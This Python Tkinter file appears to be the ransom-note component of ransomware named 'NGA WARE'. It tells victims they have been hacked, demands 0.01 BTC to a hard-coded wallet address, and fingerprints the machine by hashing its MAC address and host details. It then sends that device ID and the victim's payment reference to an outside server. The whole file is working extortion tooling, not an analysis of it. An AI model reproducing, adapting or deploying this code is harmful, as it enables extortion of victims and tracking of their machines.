import tkinter as tk
from tkinter import messagebox
import requests
import threading
import hashlib
import platform
import uuid
# Define the server endpoint (Replace with your actual server URL)
SERVER_URL = "https://api.procelnex.com/submit_reference"  # Replace this URL

def generate_device_id():
    mac_address = get_mac_address()
    system_info = f"{platform.node()}-{platform.system()}-{platform.release()}"
    unique_string = f"{mac_address}-{system_info}"
    device_id = hashlib.sha256(unique_string.encode()).hexdigest()
    return device_id

def get_mac_address():
    try:
        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2 * 6, 2)][::-1])
        return mac
    except Exception as e:
        print(f"Error getting MAC address: {e}")
        return "00:00:00:00:00:00"

def submit_reference():
    ref = reference_input.get()
    
    if ref:
        # Start a new thread for the network request to prevent freezing the UI
        threading.Thread(target=process_reference_submission, args=(ref,)).start()
    else:
        messagebox.showwarning("Warning", "Please enter your transaction reference.")

def process_reference_submission(ref):
    # Show the spinner during the submission process
    show_spinner()

    try:
        # Send the reference to the server via POST request
        device_id = generate_device_id()
        response = requests.post(SERVER_URL, json={"transaction_reference": ref, 'device_id': device_id})

        # Stop the spinner once the request is done
        stop_spinner()

        if response.status_code == 200:
            messagebox.showinfo("Transaction Submitted", f"Reference: {ref}\nSubmitted successfully.")
        else:
            messagebox.showerror("Submission Failed", f"Server error: {response.status_code}")
    except requests.exceptions.RequestException as e:
        stop_spinner()
        messagebox.showerror("Network Error", f"An error occurred: {e}")

def show_spinner():
    spinner_label.config(text="Submitting transaction...")
    rotate_spinner()  # Start rotating the spinner

def stop_spinner():
    spinner_label.config(text="")  # Clear the spinner

def rotate_spinner():
    current_text = spinner_label.cget("text")
    if "..." in current_text:
        spinner_label.config(text="Submitting transaction")
    else:
        spinner_label.config(text=current_text + ".")
    # Continue rotating the spinner until it is stopped
    if spinner_label.cget("text") != "":
        spinner_label.after(300, rotate_spinner)

def launch_gui():
    # Create the main window
    root = tk.Tk()
    root.title("NGA WARE")
    root.geometry("480x450")  # Adjust window size to contain all elements
    root.config(bg="#f7f7f7")  # Light background for a clean look

    # Frame to hold content for better organization
    frame = tk.Frame(root, bg="white", padx=20, pady=20)
    frame.pack(pady=20, padx=20, fill="both", expand=True)

    # Title message: Hack warning
    hack_label = tk.Label(
        frame, 
        text="YOU HAVE BEEN HACKED, BUT DON'T PANIC!", 
        font=("Arial", 16, "bold"), 
        bg="white", 
        fg="red",
        wraplength=400,
        justify="center"
    )
    hack_label.pack(pady=5)

    # Instruction to pay BTC and paste transaction reference
    title_label = tk.Label(
        frame, 
        text="Pay 0.01 BTC to the wallet address below and paste your transaction reference:", 
        font=("Arial", 10, "bold"), 
        bg="white", 
        wraplength=400,
        justify="center"
    )
    title_label.pack(pady=10)

    # Wallet address (with a bold style for emphasis)
    wallet_label = tk.Label(
        frame, 
        text="bc1qu6m7ww042ppasq32m9qz3g2z5w2l5r6zfxvfkk", 
        font=("Arial", 12, "bold"), 
        bg="white", 
        fg="#007bff"
    )
    wallet_label.pack(pady=5)

    # Input box for transaction reference
    global reference_input
    reference_input = tk.Entry(frame, width=40, font=("Arial", 12), bd=2, relief="solid")
    reference_input.pack(pady=10)

    # Submit button with a modern design
    submit_button = tk.Button(
        frame, 
        text="Submit Transaction", 
        command=submit_reference, 
        bg="#28a745", 
        fg="white", 
        font=("Arial", 12, "bold"), 
        bd=0, 
        relief="raised", 
        padx=10, 
        pady=5
    )
    submit_button.pack(pady=10)

    # Spinner label (empty initially, used to show progress)
    global spinner_label
    spinner_label = tk.Label(frame, font=("Arial", 10, "italic"), bg="white", fg="black")
    spinner_label.pack(pady=10)

    # Warning message at the bottom
    warning_label = tk.Label(
        frame, 
        text="Do not modify any file to avoid damage to your computer or data corruption.", 
        font=("Arial", 10, "italic"), 
        fg="red", 
        bg="white", 
        wraplength=400,
        justify="center"
    )
    warning_label.pack(pady=20)

    # Start the Tkinter event loop
    root.mainloop()

launch_gui()
